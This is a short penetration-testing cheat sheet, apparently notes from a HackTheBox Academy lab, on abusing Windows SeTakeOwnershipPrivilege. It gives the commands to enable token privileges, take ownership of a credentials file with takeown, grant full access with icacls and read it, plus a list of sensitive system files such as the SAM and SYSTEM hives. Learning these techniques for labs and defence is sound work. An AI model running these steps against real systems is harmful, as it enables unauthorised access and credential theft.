# SeTakeOwnershipPrivilege

change some file ownership, and read it.

```powershell
PS C:\mane> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

## Enabling SeTakeOwnershipPrivilege via EnableAllTokenPrivs

https://github.com/fashionproof/EnableAllTokenPrivs/tree/master

```powershell
PS C:\mane> Import-Module .\Enable-Privilege.ps1
PS C:\mane> .\EnableAllTokenPrivs.ps1
PS C:\mane> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

## Abuse Target File

```
# Checking File Ownership
PS C:\mane> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

# Checking Folder Ownership
PS C:\mane> cmd /c dir /q 'C:\Department Shares\Private\IT'

# Taking Ownership of the File
PS C:\mane> takeown /f 'C:\Department Shares\Private\IT\cred.txt'

# Confirming Ownership Changed
PS C:\mane> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# Modifying the File ACL
PS C:\mane> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

# Reading the File
cat 'C:\Department Shares\Private\IT\cred.txt'
```

## Some Interesting File on windows

```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

## Reference 

+ Hackthebox academy - Windows Privilege Escalation - SeTakeOwnershipPrivilege